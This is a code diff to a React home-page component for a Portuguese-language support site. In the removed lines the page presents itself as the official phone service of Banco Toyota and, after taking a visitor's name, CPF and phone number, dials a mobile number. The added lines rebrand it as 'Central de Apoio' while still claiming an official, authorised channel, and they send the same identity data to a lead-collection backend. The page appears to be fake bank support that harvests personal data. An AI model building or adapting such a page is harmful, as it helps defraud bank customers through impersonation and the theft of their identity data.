@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
-import { FileText, Coins, Percent, ArrowRight, ShieldAlert, CheckCircle, Smartphone, MessageSquare, Phone, ShieldCheck, X } from 'lucide-react';
+import { FileText, Coins, Percent, ArrowRight, ShieldAlert, CheckCircle, Smartphone, Mail, ShieldCheck, X } from 'lucide-react';
+import { submitLead } from '../lib/leads';
 
 interface HomeTabProps {
   setActiveTab: (tab: string) => void;
@@ -44,12 +45,26 @@ export default function HomeTab({ setActiveTab }: HomeTabProps) {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+    submitLead({
+      nome,
+      email: '',
+      cpf,
+      telefone,
+      assunto: 'Atendimento Geral - Página Inicial',
+      originDomain: 'https://www.centraldeapoio.com',
+      targetEmail: 'suporte@centraldeapoio.com',
+    });
+
+    const emailSubject = `Solicitação de Atendimento - Central de Apoio`;
+    const emailBody = `Olá, gostaria de solicitar atendimento para meu contrato:
+- Nome: ${nome}
+- CPF/CNPJ: ${cpf}
+- Telefone: ${telefone}
+
+Enviado via www.centraldeapoio.com`;
+
+    window.location.href = `mailto:suporte@centraldeapoio.com?subject=${encodeURIComponent(emailSubject)}&body=${encodeURIComponent(emailBody)}`;
     setSubmitted(true);
-    setTimeout(() => {
-      window.location.href = 'tel:11977655148';
-      setIsOpen(false);
-      setSubmitted(false);
-    }, 1800);
   };
 
   return (
@@ -208,11 +223,11 @@ export default function HomeTab({ setActiveTab }: HomeTabProps) {
         <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 border-b border-slate-100 pb-6">
           <div className="space-y-1">
             <h2 className="font-display text-2xl font-extrabold text-gray-900 flex items-center gap-2">
-              <Phone className="h-6 w-6 text-red-600 shrink-0" />
-              Atendimento por Telefone Oficial Banco Toyota
+              <Mail className="h-6 w-6 text-red-600 shrink-0" />
+              Atendimento Oficial Central de Apoio
             </h2>
             <p className="text-sm text-slate-500">
-              Inicie um atendimento seguro por telefone com nossos especialistas para resolver pendências do seu contrato.
+              Inicie um atendimento seguro por e-mail com nossos especialistas para resolver pendências do seu contrato.
             </p>
           </div>
           <div className="flex items-center space-x-2 bg-red-50 px-3.5 py-1.5 rounded-full text-xs font-semibold text-red-700 border border-red-100 shrink-0">
@@ -225,9 +240,9 @@ export default function HomeTab({ setActiveTab }: HomeTabProps) {
           {/* Informative text */}
           <div className="lg:col-span-7 space-y-6">
             <div className="space-y-4">
-              <h3 className="text-lg font-bold text-slate-850">Como funciona o nosso canal de suporte telefônico?</h3>
+              <h3 className="text-lg font-bold text-slate-850">Como funciona o nosso canal de suporte por e-mail?</h3>
               <p className="text-slate-600 text-sm leading-relaxed">
-                Nossa central de voz foi projetada para tornar a sua experiência o mais rápida e prática possível. Sem burocracia, você pode solicitar os seguintes serviços em minutos falando com um consultor autorizado:
+                Nossa central de atendimento por e-mail foi projetada para tornar a sua experiência o mais rápida e prática possível. Sem burocracia, você pode solicitar os seguintes serviços enviando sua mensagem para <strong>suporte@centraldeapoio.com</strong>:
               </p>
             </div>
 
@@ -263,17 +278,17 @@ export default function HomeTab({ setActiveTab }: HomeTabProps) {
             <div className="space-y-4">
               <div className="space-y-1">
                 <span className="text-[10px] font-bold text-red-700 uppercase tracking-widest block">Canal Oficial Autorizado</span>
-                <h4 className="text-lg font-extrabold text-slate-900 leading-tight">Atendimento Instantâneo</h4>
+                <h4 className="text-lg font-extrabold text-slate-900 leading-tight">Atendimento por E-mail</h4>
               </div>
               
               <p className="text-xs text-slate-600 leading-relaxed">
-                Clique no botão abaixo para preencher o formulário de segurança e ser conectado de forma rápida e segura ao nosso telefone de suporte oficial.
+                Clique no botão abaixo para preencher o formulário e enviar sua solicitação para <strong>suporte@centraldeapoio.com</strong>.
               </p>
 
               <div className="space-y-2 pt-2">
                 <div className="flex items-center gap-2 text-xs text-slate-700">
                   <span className="h-1.5 w-1.5 rounded-full bg-red-500" />
-                  <span>Média de resposta: <strong>menos de 2 min</strong></span>
+                  <span>Média de resposta: <strong>rápida por e-mail</strong></span>
                 </div>
                 <div className="flex items-center gap-2 text-xs text-slate-700">
                   <span className="h-1.5 w-1.5 rounded-full bg-red-500" />
@@ -288,12 +303,12 @@ export default function HomeTab({ setActiveTab }: HomeTabProps) {
                 className="w-full rounded-xl bg-red-600 py-4 text-xs font-bold text-white shadow-md shadow-red-600/20 hover:bg-red-700 hover:scale-[1.02] active:scale-[0.98] transition-all cursor-pointer flex items-center justify-center space-x-2 border-none outline-none"
                 id="btn-phone-home-info"
               >
-                <Phone className="h-4.5 w-4.5 shrink-0" />
-                <span>Solicitar por Telefone</span>
+                <Mail className="h-4.5 w-4.5 shrink-0" />
+                <span>Solicitar por E-mail</span>
               </button>
 
               <div className="text-center space-y-1">
-                <span className="text-[10px] text-slate-500 block">Atendimento ativo com registro oficial.</span>
+                <span className="text-[10px] text-slate-500 block">Atendimento ativo via suporte@centraldeapoio.com.</span>
               </div>
             </div>
           </div>
@@ -353,7 +368,7 @@ export default function HomeTab({ setActiveTab }: HomeTabProps) {
             <div className="bg-slate-50 border-b border-gray-100 p-5 flex items-center justify-between">
               <div>
                 <h3 className="text-sm font-bold text-gray-900">Solicitar Atendimento</h3>
-                <p className="text-[11px] text-slate-500 mt-0.5">Falar com Central de Atendimento por Telefone</p>
+                <p className="text-[11px] text-slate-500 mt-0.5">Enviar solicitação para suporte@centraldeapoio.com</p>
               </div>
               <button 
                 type="button"
@@ -367,14 +382,21 @@ export default function HomeTab({ setActiveTab }: HomeTabProps) {
             {submitted ? (
               <div className="p-8 text-center space-y-4">
                 <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-emerald-100 text-emerald-600">
-                  <Phone className="h-6 w-6 animate-pulse" />
+                  <Mail className="h-6 w-6 animate-pulse" />
                 </div>
                 <div className="space-y-2">
-                  <h4 className="text-sm font-bold text-gray-900">Discando para a Central Oficial...</h4>
+                  <h4 className="text-sm font-bold text-gray-900">Solicitação Enviada!</h4>
                   <p className="text-xs text-slate-500 leading-relaxed max-w-xs mx-auto">
-                    Conectando ao telefone de suporte. Confirme a chamada no seu aparelho para falar conosco.
+                    Sua mensagem foi direcionada para <strong>suporte@centraldeapoio.com</strong>.
                   </p>
                 </div>
+                <button
+                  type="button"
+                  onClick={() => setIsOpen(false)}
+                  className="mt-2 text-xs text-slate-400 hover:text-slate-600 underline font-medium cursor-pointer bg-transparent border-none outline-none"
+                >
+                  Fechar
+                </button>
               </div>
             ) : (
               /* Form */
@@ -422,8 +444,8 @@ export default function HomeTab({ setActiveTab }: HomeTabProps) {
                     type="submit"
                     className="w-full py-3.5 rounded-xl bg-red-600 hover:bg-red-700 text-white text-xs font-bold shadow-md shadow-red-600/20 transition-all flex items-center justify-center space-x-2 cursor-pointer hover:scale-[1.02] active:scale-[0.98] text-center border-none outline-none"
                   >
-                    <Phone className="h-4 w-4 shrink-0" />
-                    <span>Iniciar Atendimento por Telefone</span>
+                    <Mail className="h-4 w-4 shrink-0" />
+                    <span>Enviar Solicitação por E-mail</span>
                   </button>
                 </div>
               </form>
